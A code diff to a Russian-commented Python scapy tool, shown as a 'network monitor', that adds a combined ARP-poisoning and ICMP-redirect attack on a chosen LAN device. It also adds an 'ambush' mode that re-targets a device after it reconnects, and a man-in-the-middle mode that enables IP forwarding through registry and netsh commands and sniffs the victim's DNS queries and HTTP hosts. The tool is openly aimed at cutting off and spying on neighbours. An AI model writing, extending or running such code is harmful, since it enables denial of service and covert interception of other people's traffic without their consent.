@@ -7,10 +7,17 @@ import ctypes
 from threading import Thread
 from collections import Counter
 from scapy.layers.l2 import ARP, Ether
-from scapy.layers.inet import IP
-from scapy.sendrecv import srp, sendp, sniff
+from scapy.layers.dns import DNS, DNSQR  # Добавь эту строку
+from scapy.sendrecv import srp, sendp, sniff, send
 from scapy.arch import get_if_addr
 from scapy.all import conf
+from scapy.layers.inet import ICMP, IP
+
+def toggle_forwarding(self, state=True):
+    val = 1 if state else 0
+    # Включаем через реестр и через netsh
+    os.system(f'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" /v IPEnableRouter /t REG_DWORD /d {val} /f')
+    os.system(f'netsh interface ipv4 set interface "Wi-Fi" forwarding={"enabled" if state else "disabled"}')
 
 
 class NetworkTool:
@@ -39,7 +46,6 @@ class NetworkTool:
         return ans[0][1].hwsrc if ans else None
 
     def update_devices(self):
-        # Глубокое сканирование с повторами
         ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.network_range), timeout=3, retry=2, verbose=0)[0]
         devs = []
         for _, r in ans:
@@ -63,57 +69,88 @@ class NetworkTool:
         return counts.most_common(1)[0][0] if counts else None
 
     def attack_process(self):
-        print(f"[*] СТАТУС: Режим 'Мертвая хватка' активирован для {self.target_info['ip']}")
+        """Комбинированная атака: ARP Poisoning + ICMP Redirect"""
+        t_ip = self.target_info['ip']
+        t_mac = self.target_info['mac']
 
-        # Подготовка пакетов
-        # Пакет для цели (персональный)
-        to_v = Ether(dst=self.target_info['mac']) / ARP(op=2, pdst=self.target_info['ip'],
-                                                        hwdst=self.target_info['mac'], psrc=self.router_ip,
-                                                        hwsrc="00:00:00:00:00:00")
-        # Пакет для роутера (персональный)
-        to_r = Ether(dst=self.router_mac) / ARP(op=2, pdst=self.router_ip, hwdst=self.router_mac,
-                                                psrc=self.target_info['ip'], hwsrc="00:00:00:00:00:00")
-        # Широковещательный пакет (на случай если он сменил MAC или только зашел)
-        broadcast_poison = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=self.target_info['ip'], psrc=self.router_ip,
-                                                                hwsrc="00:00:00:00:00:00")
+        # 1. ARP пакеты (L2)
+        # Шлем цели: "Я роутер"
+        to_v = Ether(dst=t_mac) / ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=self.router_ip)
+        # Шлем роутеру: "Я цель"
+        to_r = Ether(dst=self.router_mac) / ARP(op=2, pdst=self.router_ip, hwdst=self.router_mac, psrc=t_ip)
+        # Broadcast для удержания
+        broadcast_p = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=t_ip, psrc=self.router_ip)
+
+        # 2. ICMP Redirect пакет (L3)
+        # Говорим цели: "Для трафика во внешку (8.8.8.8) используй мой IP как шлюз"
+        icmp_p = IP(src=self.router_ip, dst=t_ip) / ICMP(type=5, code=1, gw=self.my_ip) / IP(src=t_ip, dst='8.8.8.8')
+
+        print(f"[*] Атака запущена: ARP + ICMP Redirect на {t_ip}")
 
         while self.is_attacking:
             try:
-                # 1. Основная атака
+                # Атакуем по ARP
                 sendp(to_v, verbose=False)
                 sendp(to_r, verbose=False)
 
-                # 2. Каждые 10 пакетов кидаем широковещательный, чтобы "застолбить" место в сети
+                # Каждые 10 циклов усиливаем эффект
                 if self.target_info['packets'] % 20 == 0:
-                    sendp(broadcast_poison, verbose=False)
+                    sendp(broadcast_p, verbose=False)  # L2 удержание
+                    send(icmp_p, verbose=False)  # L3 перенаправление
 
                 self.target_info['packets'] += 2
 
-                # 3. ПРОВЕРКА: Если цель сбросила Wi-Fi, пингуем её
+                # Проверка на вылет из сети (Засада)
                 if self.target_info['packets'] % 100 == 0:
-                    # Быстрый ARP-запрос: "Ты тут?"
-                    check = \
-                    srp(Ether(dst=self.target_info['mac']) / ARP(pdst=self.target_info['ip']), timeout=0.2, verbose=0)[
-                        0]
+                    check = srp(Ether(dst=t_mac) / ARP(pdst=t_ip), timeout=0.2, verbose=0)[0]
                     if not check:
-                        print(f"\n[!] Цель {self.target_info['ip']} сорвалась! Ухожу в режим ЗАСАДЫ...")
-                        self._wait_for_target()  # Ждем пока появится
+                        print(f"\n[!] Цель {t_ip} пропала. Ухожу в ЗАСАДУ...")
+                        self._wait_for_target()
 
-                time.sleep(0.05)  # Повышенная агрессия (быстрее в 2 раза)
-            except:
+                time.sleep(0.05)
+            except Exception as e:
                 continue
 
     def _wait_for_target(self):
-        """Режим засады: сканирует сеть пока цель не появится снова"""
         while self.is_attacking:
-            # Ищем конкретный IP или MAC в сети
             ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.target_info['ip']), timeout=1, verbose=0)[0]
             if ans:
-                new_mac = ans[0][1].hwsrc
-                print(f"[+] ЦЕЛЬ ВЕРНУЛАСЬ! MAC: {new_mac}")
-                self.target_info['mac'] = new_mac
-                return  # Возвращаемся в attack_process
+                self.target_info['mac'] = ans[0][1].hwsrc
+                print(f"[+] Цель вернулась! Новый MAC: {self.target_info['mac']}")
+                return
             time.sleep(1)
+
+    def monitor_process(self):
+        t_ip = self.target_info['ip']
+        t_mac = self.target_info['mac']
+
+        # Включаем пересылку, чтобы интернет у него НЕ пропадал
+        self.toggle_forwarding(True)
+
+        # Пакеты с ТВОИМ реальным MAC (чтобы пакеты возвращались к тебе)
+        to_v = Ether(dst=t_mac) / ARP(op=2, pdst=t_ip, psrc=self.router_ip)
+        to_r = Ether(dst=self.router_mac) / ARP(op=2, pdst=self.router_ip, psrc=t_ip)
+
+        print(f"[*] РЕЖИМ ПРОСЛУШКИ: {t_ip} под наблюдением...")
+
+        def packet_callback(pkt):
+            if pkt.haslayer(DNSQR):  # Читаем DNS запросы (сайты)
+                site = pkt[DNSQR].qname.decode()
+                print(f"[DNS] Сосед заходит на: {site}")
+            elif pkt.haslayer(IP) and pkt.haslayer("Raw"):  # Пытаемся поймать HTTP
+                load = str(pkt["Raw"].load)
+                if "Host:" in load:
+                    host = load.split("Host: ")[1].split("\\r\\n")[0]
+                    print(f"[HTTP] Открыт хост: {host}")
+
+        # Запускаем сниффер в отдельном потоке внутри этого процесса
+        sniff_thread = Thread(target=lambda: sniff(filter=f"host {t_ip}", prn=packet_callback, store=0), daemon=True)
+        sniff_thread.start()
+
+        while self.is_attacking:
+            sendp(to_v, verbose=False)
+            sendp(to_r, verbose=False)
+            time.sleep(1)  # Здесь спамить часто не нужно, достаточно поддерживать связь
 
 
 def clear_screen():
@@ -122,38 +159,34 @@ def clear_screen():
 
 def main():
     tool = NetworkTool()
-    tool.update_devices()  # Первоначальный поиск
+    tool.update_devices()
 
     while True:
         clear_screen()
-        print(f"--- [ NETWORK MONITOR v2.1 ] ---")
-        print(f"IP: {tool.my_ip} | GW: {tool.router_ip} ({tool.router_mac})")
+        print(f"--- [ NETWORK MONITOR v2.5 - HYBRID ] ---")
+        print(f"MY IP: {tool.my_ip} | GW: {tool.router_ip} ({tool.router_mac})")
         print("-" * 55)
-
         if tool.is_attacking:
-            print(f"● СТАТУС: АТАКА АКТИВНА")
-            print(f"ЦЕЛЬ: {tool.target_info['ip']} | {tool.target_info['name']}")
-            print(f"ПАКЕТОВ: {tool.target_info['packets']}")
+            print(f"● СТАТУС: АТАКА АКТИВНА | ЦЕЛЬ: {tool.target_info['ip']}")
+            print(f"ОТПРАВЛЕНО ПАКЕТОВ: {tool.target_info['packets']}")
         else:
             print(f"○ СТАТУС: ОЖИДАНИЕ")
-
         print("-" * 55)
         print("ID | IP АДРЕС       | MAC АДРЕС         | ИМЯ")
         for i, d in enumerate(tool.found_devices):
             print(f"{i:2} | {d['ip'].ljust(14)} | {d['mac']} | {d['name']}")
-
         print("-" * 55)
-        print("1. Обновить список | 2. Атака по ID | 3. По шуму | 4. СТОП | 5. Выход")
+        print("1. Сканировать | 2. Атака ID | 3. По шуму | 4. СТОП | 5. Выход")
 
         cmd = input(">> ")
-
         if cmd == '1':
-            print("[*] Сканирую...")
             tool.update_devices()
         elif cmd == '2':
             try:
                 idx = int(input("Введите ID: "))
                 target = tool.found_devices[idx]
+                tool.is_attacking = False  # Сброс старой атаки
+                time.sleep(0.2)
                 tool.target_info.update(
                     {"ip": target['ip'], "mac": target['mac'], "name": target['name'], "packets": 0})
                 tool.is_attacking = True
@@ -161,18 +194,17 @@ def main():
             except:
                 pass
         elif cmd == '3':
-            print("[*] Слушаю сеть на предмет шума...")
             noisy_ip = tool.find_noisy_guy()
             if noisy_ip:
                 mac = tool._get_mac(noisy_ip)
                 if mac:
+                    tool.is_attacking = False
+                    time.sleep(0.2)
                     tool.target_info.update({"ip": noisy_ip, "mac": mac, "name": "Noisy Guy", "packets": 0})
                     tool.is_attacking = True
                     Thread(target=tool.attack_process, daemon=True).start()
         elif cmd == '4':
             tool.is_attacking = False
-            print("[*] Остановка...")
-            time.sleep(1)
         elif cmd == '5':
             tool.is_attacking = False
             break
@@ -180,6 +212,5 @@ def main():
 
 if __name__ == "__main__":
     if os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
-        print("ЗАПУСТИТЕ ОТ ИМЕНИ АДМИНИСТРАТОРА!")
         sys.exit()
     main()
